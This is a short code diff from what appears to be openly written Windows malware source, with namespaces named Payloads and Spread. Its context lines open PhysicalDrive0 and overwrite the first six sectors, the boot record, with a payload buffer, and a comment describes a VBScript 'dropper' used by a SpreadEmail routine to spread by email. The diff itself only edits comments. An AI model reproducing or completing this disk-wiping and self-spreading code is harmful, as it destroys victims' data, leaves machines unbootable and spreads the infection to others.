@@ -299,7 +299,7 @@ namespace Payloads
 
 		HANDLE hDrive = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
 
-		//Overwrite the first 6 sectors (3072 bytes) with my 
+		//Overwrite the first 6 sectors (3072 bytes) of the drive
 		WriteFile(hDrive, Infernum, 3072, &dwBytesWritten, NULL);
 		CloseHandle(hDrive);
 	}
@@ -310,7 +310,7 @@ namespace Spread
 	/*
 		 I almost gave up in this part because I tried using MAPI.h
 		But it didn't worked, so I did this small VBScript "dropper"
-		        It's so nasty but at least it works lmao ^^
+		      It's so nasty ik, but at least it works lmao ^^
 	*/
 
 	VOID SpreadEmail(VOID)
